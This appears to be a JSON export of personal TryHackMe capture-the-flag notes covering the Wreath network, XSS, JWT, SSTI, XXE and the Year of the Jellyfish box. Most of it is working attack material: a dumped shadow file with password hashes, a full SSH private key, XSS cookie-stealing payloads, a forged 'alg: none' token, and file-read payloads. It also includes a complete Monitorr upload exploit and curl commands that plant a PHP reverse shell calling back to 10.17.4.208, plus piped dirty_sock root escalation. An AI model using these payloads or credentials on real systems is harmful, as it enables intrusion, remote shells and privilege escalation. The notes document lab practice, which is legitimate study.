/etc/shadow\nroot:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::\nbin:*:18358:0:99999:7:::\ndaemon:*:18358:0:99999:7:::\nadm:*:18358:0:99999:7:::\nlp:*:18358:0:99999:7:::\nsync:*:18358:0:99999:7:::\nshutdown:*:18358:0:99999:7:::\nhalt:*:18358:0:99999:7:::\nmail:*:18358:0:99999:7:::\noperator:*:18358:0:99999:7:::\ngames:*:18358:0:99999:7:::\nftp:*:18358:0:99999:7:::\nnobody:*:18358:0:99999:7:::\ndbus:!!:18573::::::\nsystemd-coredump:!!:18573::::::\nsystemd-resolve:!!:18573::::::\ntss:!!:18573::::::\npolkitd:!!:18573::::::\nlibstoragemgmt:!!:18573::::::\ncockpit-ws:!!:18573::::::\ncockpit-wsinstance:!!:18573::::::\nsssd:!!:18573::::::\nsshd:!!:18573::::::\nchrony:!!:18573::::::\nrngd:!!:18573::::::\ntwreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::\nunbound:!!:18573::::::\napache:!!:18573::::::\nnginx:!!:18573::::::\nmysql:!!:18573::::::\n</code></pre> <p>ssh keys</p> <pre><code>-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n</code></pre> <p></p>"},{"location":"Wreath/10.200.109.200/05-Pivoting/","title":"05 Pivoting","text":"<p>Running nmap for getting the other machines in the network</p> <pre><code>-bash-4.4# ./nmap_sp00f -sn 10.200.109.1-255 -oN scan_sp00f\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-10 06:32 BST\nCannot find nmap-payloads. UDP payloads are disabled.\nNmap scan report for ip-10-200-109-1.eu-west-1.compute.internal (10.200.109.1)\nCannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed\nHost is up (0.00028s latency).\nMAC Address: 02:10:71:E5:86:01 (Unknown)\nNmap scan report for ip-10-200-109-100.eu-west-1.compute.internal (10.200.109.100)\nHost is up (0.00014s latency).\nMAC Address: 02:CF:1B:5D:57:4F (Unknown)\nNmap scan report for ip-10-200-109-150.eu-west-1.compute.internal (10.200.109.150)\nHost is up (-0.10s latency).\nMAC Address: 02:0B:6D:4B:ED:13 (Unknown)\nNmap scan report for ip-10-200-109-250.eu-west-1.compute.internal (10.200.109.250)\nHost is up (0.00016s latency).\nMAC Address: 02:2F:98:4C:5D:77 (Unknown)\nNmap scan report for ip-10-200-109-200.eu-west-1.compute.internal (10.200.109.200)\nHost is up.\nNmap done: 255 IP addresses (5 hosts up) scanned in 3.73 seconds\n-bash-4.4# \n</code></pre> <p>Scanning port 10.200.109.100</p> <pre><code>-bash-4.4# ./nmap_sp00f -v 10.200.109.100 -oN sp00f_scan_100\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-10 06:37 BST\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nInitiating ARP Ping Scan at 06:37\nScanning 10.200.109.100 [1 port]\nCompleted ARP Ping Scan at 06:37, 0.21s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 06:37\nCompleted Parallel DNS resolution of 1 host. at 06:37, 0.00s elapsed\nInitiating SYN Stealth Scan at 06:37\nScanning ip-10-200-109-100.eu-west-1.compute.internal (10.200.109.100) [6150 ports]\nSYN Stealth Scan Timing: About 24.07% done; ETC: 06:39 (0:01:38 remaining)\nSYN Stealth Scan Timing: About 48.33% done; ETC: 06:39 (0:01:05 remaining)\nSYN Stealth Scan Timing: About 72.64% done; ETC: 06:39 (0:00:34 remaining)\nCompleted SYN Stealth Scan at 06:39, 124.32s elapsed (6150 total ports)\nNmap scan report for ip-10-200-109-100.eu-west-1.compute.internal (10.200.109.100)\nCannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed\nHost is up (-0.20s latency).\nAll 6150 scanned ports on ip-10-200-109-100.eu-west-1.compute.internal (10.200.109.100) are filtered\nMAC Address: 02:CF:1B:5D:57:4F (Unknown)\n\nRead data files from: /etc\nNmap done: 1 IP address (1 host up) scanned in 124.57 seconds\n           Raw packets sent: 12302 (541.256KB) | Rcvd: 1 (28B)\n-bash-4.4# \n</code></pre> <p>Here all ports are filtered</p> <p>scanning port 150</p> <pre><code>-bash-4.4# ./nmap_sp00f -v 10.200.109.150 -oN sp00f_scan_150\n\nStarting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-04-10 06:40 BST\nUnable to find nmap-services!  Resorting to /etc/services\nCannot find nmap-payloads. UDP payloads are disabled.\nInitiating ARP Ping Scan at 06:40\nScanning 10.200.109.150 [1 port]\nCompleted ARP Ping Scan at 06:40, 0.20s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 06:40\nCompleted Parallel DNS resolution of 1 host. at 06:40, 0.00s elapsed\nInitiating SYN Stealth Scan at 06:40\nScanning ip-10-200-109-150.eu-west-1.compute.internal (10.200.109.150) [6150 ports]\nDiscovered open port 80/tcp on 10.200.109.150\nDiscovered open port 3389/tcp on 10.200.109.150\nDiscovered open port 5985/tcp on 10.200.109.150\nIncreasing send delay for 10.200.109.150 from 0 to 5 due to 17 out of 56 dropped probes since last increase.\nCompleted SYN Stealth Scan at 06:41, 67.99s elapsed (6150 total ports)\nNmap scan report for ip-10-200-109-150.eu-west-1.compute.internal (10.200.109.150)\nCannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed\nHost is up (0.00037s latency).\nNot shown: 6147 filtered ports\nPORT     STATE SERVICE\n80/tcp   open  http\n3389/tcp open  ms-wbt-server\n5985/tcp open  wsman\nMAC Address: 02:0B:6D:4B:ED:13 (Unknown)\n\nRead data files from: /etc\nNmap done: 1 IP address (1 host up) scanned in 68.24 seconds\n           Raw packets sent: 18499 (813.924KB) | Rcvd: 57 (2.492KB)\n-bash-4.4# \n</code></pre> <p>pivoting using sshuttle</p> <pre><code>sshuttle -r root@10.200.109.200 --ssh-cmd \"ssh -i id_rsa_root\" 10.200.109.0/24 -x 10.200.109.200\n</code></pre> <p></p> <p></p>"},{"location":"XSS%20Playground/xss/","title":"Xss","text":"<p>del</p> <p>for jack's cookie we have to get the directory where the files are stored</p> <p>and from burp we can see there is a file logs</p> <p></p> <p>so payload</p> <p>now navigate to /logs and get the cookie</p> <p></p> <p>change the cookie form storage and re-fresh</p> <p>image search:    test\" onmouseover=\"alert(document.cookie)\"</p> <p>it would show <code>Image not found</code> but hover and get the cookie</p> <p>image search:  test\" onmouseover=\"document.body.style.backgroundColor = 'red'\" </p> <p>it would show <code>Image not found</code> but hover and get the colour change</p> <p>filter bypass: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet</p> <p>challenge 1:</p> <p></p> <p>challenge 2:  </p> <p>challenge 3:</p>"},{"location":"ZTH%20Obscure%20Web%20Vulns/JWT/","title":"JWT","text":"<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoxNjIzNDEzNjE3MDg1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wIiwicm9sZSI6InVzZXIiLCJpYXQiOjE2MjM0MTM2MTd9.eagSGB_Ubo096W_zGMnmrF_dB-VvfEBEn29pKkZwTQk</p> <p>jwt header for Algo: none</p> <pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0\n</code></pre> <p><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNjIzNDE1NTk2MTMzLCJhZ2VudCI6Ik1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6NzguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC83OC4wIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjIzNDE1NTk2fQ.</code></p> <p></p> <p>and replace the cookie and we are admin</p> <p></p>"},{"location":"ZTH%20Obscure%20Web%20Vulns/JWT/#bruteforce","title":"bruteforce","text":""},{"location":"ZTH%20Obscure%20Web%20Vulns/SSTI/","title":"SSTI","text":"<p><code>{{ get_flashed_messages.__globals__.__builtins__.open(\"/flag\").read()}}</code> OR </p>"},{"location":"ZTH%20Obscure%20Web%20Vulns/XXE/","title":"XXE","text":"<p>payload</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY&gt; \n&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\" &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;\ntest&lt;/name&gt;&lt;tel&gt;\n123&lt;/tel&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;J7MFEBnJGtqVV2V&lt;/password&gt;&lt;/root&gt;\n</code></pre> <p></p>"},{"location":"ZTH%20Web%202/zthweb2/","title":"Zthweb2","text":""},{"location":"yearofthejellyfish/yearofthejellyfish/","title":"Year of the Jellyfish","text":"<pre><code>Be warned -- this box deploys with a public IP. Think about what that means for how you should approach this challenge. ISPs are often unhappy if you enumerate public IP addresses at a high speed...\n</code></pre>"},{"location":"yearofthejellyfish/yearofthejellyfish/#nmap","title":"nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oA namp 34.244.217.52\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 16:56 IST\nNmap scan report for ec2-34-244-217-52.eu-west-1.compute.amazonaws.com (34.244.217.52)\nHost is up (0.15s latency).\nNot shown: 995 filtered ports\nPORT     STATE SERVICE  VERSION\n21/tcp   open  ftp      vsftpd 3.0.3\n22/tcp   open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|_  2048 46:b2:81:be:e0:bc:a7:86:39:39:82:5b:bf:e5:65:58 (RSA)\n80/tcp   open  http     Apache httpd 2.4.29\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Did not follow redirect to https://robyns-petshop.thm/\n443/tcp  open  ssl/http Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Robyn&amp;#039;s Pet Shop\n| ssl-cert: Subject: commonName=robyns-petshop.thm/organizationName=Robyns Petshop/stateOrProvinceName=South West/countryName=GB\n| Subject Alternative Name: DNS:robyns-petshop.thm, DNS:monitorr.robyns-petshop.thm, DNS:beta.robyns-petshop.thm, DNS:dev.robyns-petshop.thm\n| Not valid before: 2021-04-26T11:25:37\n|_Not valid after:  2022-04-26T11:25:37\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\n8000/tcp open  http-alt\n| fingerprint-strings: \n|   GenericLines: \n|     HTTP/1.1 400 Bad Request\n|     Content-Length: 15\n|_    Request\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8000-TCP:V=7.91%I=7%D=4/26%Time=6086A389%P=x86_64-pc-linux-gnu%r(Ge\nSF:nericLines,3F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Length:\\x2\nSF:015\\r\\n\\r\\n400\\x20Bad\\x20Request\");\nService Info: Host: robyns-petshop.thm; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 58.94 seconds\n</code></pre>"},{"location":"yearofthejellyfish/yearofthejellyfish/#nmap-full","title":"nmap -full","text":"<pre><code>\u2514\u2500$ nmap -p- -oN nmap_full 3.249.252.29                                                                        130 \u2a2f\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-04-26 23:11 IST\nStats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan\nPing Scan Timing: About 100.00% done; ETC: 23:11 (0:00:00 remaining)\nNmap scan report for robyns-petshop.thm (3.249.252.29)\nHost is up (0.22s latency).\nNot shown: 65528 filtered ports\nPORT      STATE SERVICE\n21/tcp    open  ftp\n22/tcp    open  ssh\n80/tcp    open  http\n443/tcp   open  https\n8000/tcp  open  http-alt\n8096/tcp  open  unknown\n22222/tcp open  easyengine\n\nNmap done: 1 IP address (1 host up) scanned in 845.46 seconds\n</code></pre>"},{"location":"yearofthejellyfish/yearofthejellyfish/#web-pages","title":"web-pages","text":"<p>port 80 </p> <p>port 8000 </p> <p>port 443 (https) </p>"},{"location":"yearofthejellyfish/yearofthejellyfish/#alternate-dns","title":"alternate dns","text":"<p>https://monitorr.robyns-petshop.thm https://beta.robyns-petshop.thm https://dev.robyns-petshop.thm</p>"},{"location":"yearofthejellyfish/yearofthejellyfish/#other-ports","title":"other ports","text":"<p>port 8096 jellyfin  3.249.252.29:8096</p> <p></p>"},{"location":"yearofthejellyfish/yearofthejellyfish/#exploit","title":"exploit","text":"<p>1.7.6m monitorr exploit</p> <p>RCE: https://www.exploit-db.com/exploits/48980 here we have can upload a image </p> <p>so we have to prepare a php file with image encoding and then upload it.  and the thing to be taken care is that there is a extra parameter/header to be taken care of when uploading the file ie. the <code>\"Cookie: isHuman=1\"</code> You can see it when intercepting the requests in BurpSuite</p> <p>I initially edited the given exploit, but it was not uploading the shell.  and after tweaking the shell file name and changing the listen port to 443(there could be a firewall) it worked</p> <p>Here the shell was uploaded with <code>.png.pHp</code> but is stored with <code>.png.php</code> extension in server.</p> <pre><code>#!/usr/bin/python\n# -*- coding: UTF-8 -*-\n\n# Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)\n# Date: September 12, 2020\n# Exploit Author: Lyhin's Lab\n# Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/\n# Software Link: https://github.com/Monitorr/Monitorr\n# Version: 1.7.6m\n# Tested on: Ubuntu 19\n\nimport requests\nimport os\nimport sys\n\nif len (sys.argv) != 4:\n    print (\"specify params in format: python \" + sys.argv[0] + \" target_url lhost lport\")\nelse:\n    url = sys.argv[1] + \"/assets/php/upload.php\"\n    headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\", \"Accept\": \"text/plain, */*; q=0.01\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"X-Requested-With\": \"XMLHttpRequest\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------31046105003900160576454225745\", \"Origin\": sys.argv[1], \"Connection\": \"close\", \"Referer\": sys.argv[1], \"Cookie\": \"isHuman=1\"}\n\n    data = \"-----------------------------31046105003900160576454225745\\r\\nContent-Disposition: form-data; name=\\\"fileToUpload\\\"; filename=\\\"shell1.png.pHp\\\"\\r\\nContent-Type: image/gif\\r\\n\\r\\nGIF89a213213123&lt;?php shell_exec(\\\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/\"+sys.argv[2] +\"/\" + sys.argv[3] + \" 0&gt;&amp;1'\\\");\\r\\n\\r\\n-----------------------------31046105003900160576454225745--\\r\\n\"\n    requests.post(url, verify=False, headers=headers, data=data)\n\n    print (\"A shell script should be uploaded. Now we try to execute it\")\n    url = sys.argv[1] + \"/assets/data/usrimg/shell1.png.php\"\n    headers = {\"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}\n    requests.get(url, headers=headers, verify=False)\n\n</code></pre> <p> </p> <p>or use curl </p> <pre><code>#prepare the php rev shell file\necho -e $'\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\n&lt;?php echo system(\"bash -c \\'bash -i &gt;&amp; /dev/tcp/10.17.4.208/443 0&gt;&amp;1\\'\");' &gt; shell.png.pHp\n\n#uploading the file\ncurl -k -F \"fileToUpload=@./shell.png.pHp\" https://monitorr.robyns-petshop.thm/assets/php/upload.php -H \"Cookie: isHuman=1\"        \n\n#calling the shell file\ncurl -k https://monitorr.robyns-petshop.thm/assets/data/usrimg/shell.png.php\n</code></pre> <p></p> <p></p> <p></p>"},{"location":"yearofthejellyfish/yearofthejellyfish/#flag1","title":"flag1","text":"<p><code>user flag === THM{YjljMDYyZWUxYmQwMTkxYjNlMDY4YmY5}</code></p>"},{"location":"yearofthejellyfish/yearofthejellyfish/#root","title":"root","text":"<p>since it have a public ip </p> <p>linpeas <code>curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | bash</code></p> <p></p> <p><code>10:20   0:00 /usr/lib/snapd/snapd</code></p> <p></p> <p>2 CVEs?? </p> <p>CVE-2002-1614 CVE-2011-1485</p> <p>linux exploit suggester <code>curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash</code></p> <p></p> <p>now we are going to use the dirty sock exploit, as i have used it before and it works so good. and snapd is working too with version   2.32.5+18.04 Excellent</p> <p><code>curl https://raw.githubusercontent.com/initstring/dirty_sock/master/dirty_sockv2.py | python3</code></p> <p></p> <p>got dirty_sock as root</p> <p></p> <p></p> <p><code>root flag == THM{ZWM5N2ViY2QxNjE4MjkxOWRiYWQ4NjUx}</code></p>"}]}